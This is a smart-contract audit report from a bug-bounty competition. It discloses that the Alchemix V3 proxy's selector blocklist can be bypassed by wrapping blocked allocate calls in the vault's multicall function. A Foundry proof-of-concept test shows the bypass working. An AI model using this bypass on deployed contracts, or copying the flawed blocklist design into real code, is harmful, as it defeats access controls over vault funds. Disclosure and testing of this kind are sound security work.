# 56878 sc medium the permissionedcalls check can be bypass

**Submitted on Oct 21st 2025 at 13:10:35 UTC by @ox9527 for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #56878
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/utils/PermissionedProxy.sol>
* **Impacts:**
  * Contract fails to deliver promised returns, but doesn't lose value

## Description

## Brief/Intro

In the AlchemistAllocator::constructor() , allocate and deallocate is set to true via permissionedCalls mapping , to prevent PermissionedProxy.sol::proxy() function from invoking those two function , however VaultV2.sol::multicall() function is not add to permissionedCalls mapping.

## Vulnerability Details

In the AlchemistAllocator::constructor():

```solidity
    constructor(address _vault, address _admin, address _operator) PermissionedProxy(_admin, _operator) {
        require(IVaultV2(_vault).asset() != address(0), "IV");
        vault = IVaultV2(_vault);

        // allocate(address adapter, bytes memory data, uint256 assets)
        permissionedCalls[0x5c9ce04d] = true;
        // deallocate(address adapter, bytes memory data, uint256 assets)
        permissionedCalls[0x4b219d16] = true;
    }
```

In the PermissionedProxy.sol::proxy() :

```solidity
    function proxy(address vault, bytes memory data) external payable onlyAdmin {
        bytes4 selector;
        require(data.length >= 4, "SEL");
        assembly {
          selector := mload(add(data, 32))
        }
        require(!permissionedCalls[selector], "PD");

        (bool success, ) = vault.call{value: msg.value}(data);
        require(success, "failed");
    }
```

However VaultV2.sol has multicall function , allocate and deallocate can be called via multicall function.

## Impact Details

by pass the permissionedCalls check

## References

## Proof of Concept

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {VaultV2} from "../../lib/vault-v2/src/VaultV2.sol";
import {IVaultV2} from "../../lib/vault-v2/src/interfaces/IVaultV2.sol";
import {TestYieldToken} from "./mocks/TestYieldToken.sol";
import {TestERC20} from "./mocks/TestERC20.sol";
import {TokenUtils} from "../libraries/TokenUtils.sol";
import {MockYieldToken} from "./mocks/MockYieldToken.sol";
import {IMockYieldToken} from "./mocks/MockYieldToken.sol";
import {MYTTestHelper} from "./libraries/MYTTestHelper.sol";
import {MockMYTStrategy} from "./mocks/MockMYTStrategy.sol";
import {AlchemistAllocator} from "../AlchemistAllocator.sol";
import {IAllocator} from "../interfaces/IAllocator.sol";
import {IMYTStrategy} from "../interfaces/IMYTStrategy.sol";
import "forge-std/console2.sol";
contract MockAlchemistAllocator is AlchemistAllocator {
    constructor(address _myt, address _admin, address _operator) AlchemistAllocator(_myt, _admin, _operator) {}
}

contract AlchemistAllocatorTest is Test {
    using MYTTestHelper for *;

    MockAlchemistAllocator public allocator;
    VaultV2 public vault;
    address public admin = address(0x2222222222222222222222222222222222222222);
    address public operator = address(0x3333333333333333333333333333333333333333);
    address public curator = address(0x8888888888888888888888888888888888888888);
    address public user1 = address(0x5555555555555555555555555555555555555555);
    address public mockVaultCollateral = address(new TestERC20(100e18, uint8(18)));
    address public mockStrategyYieldToken = address(new MockYieldToken(mockVaultCollateral));
    uint256 public defaultStrategyAbsoluteCap = 200 ether;
    uint256 public defaultStrategyRelativeCap = 1e18; // 100%
    MockMYTStrategy public mytStrategy;

    function setUp() public {
        vm.startPrank(admin);
        vault = MYTTestHelper._setupVault(mockVaultCollateral, admin, curator);
        mytStrategy = MYTTestHelper._setupStrategy(address(vault), mockStrategyYieldToken, admin, "MockToken", "MockTokenProtocol", IMYTStrategy.RiskClass.LOW);
        allocator = new MockAlchemistAllocator(address(vault), admin, operator);
        vm.stopPrank();
        vm.startPrank(curator);
        _vaultSubmitAndFastForward(abi.encodeCall(IVaultV2.setIsAllocator, (address(allocator), true)));
        vault.setIsAllocator(address(allocator), true);
        _vaultSubmitAndFastForward(abi.encodeCall(IVaultV2.addAdapter, address(mytStrategy)));
        vault.addAdapter(address(mytStrategy));
        // bytes memory idData = abi.encode("MockTokenProtocol", address(mytStrategy));
        bytes memory idData = mytStrategy.getIdData();
        _vaultSubmitAndFastForward(abi.encodeCall(IVaultV2.increaseAbsoluteCap, (idData, defaultStrategyAbsoluteCap)));
        vault.increaseAbsoluteCap(idData, defaultStrategyAbsoluteCap);
        _vaultSubmitAndFastForward(abi.encodeCall(IVaultV2.increaseRelativeCap, (idData, defaultStrategyRelativeCap)));
        vault.increaseRelativeCap(idData, defaultStrategyRelativeCap);
        vm.stopPrank();
    }

    function test_POC_11() public {
        address alice = address(0x1001);
        _magicDepositToVault(address(vault), alice, 150 ether);

        vm.startPrank(admin);
        bytes32 allocationId = mytStrategy.adapterId();
        allocator.allocate(address(mytStrategy), 10 ether);

        //function allocate(address adapter, bytes memory data, uint256 assets) external {
        bytes memory data = abi.encodeWithSelector(
            IVaultV2.allocate.selector,
            address(mytStrategy),
            abi.encode(vault.allocation(allocationId)),
            10e18
        );

        //first call revert.
        vm.expectRevert();
        allocator.proxy(address(vault), data);

        //second call success.
        bytes[] memory datas = new bytes[](1);
        datas[0] = data;

        bytes memory mulSelector = abi.encodeWithSelector(
            IVaultV2.multicall.selector,
            datas
        );

        //multiple call.
        allocator.proxy(address(vault),mulSelector);

        //check allocation.
        console2.log(vault.allocation(allocationId));

        //10 + 10.
        assert(vault.allocation(allocationId) == 20e18);

    }
```
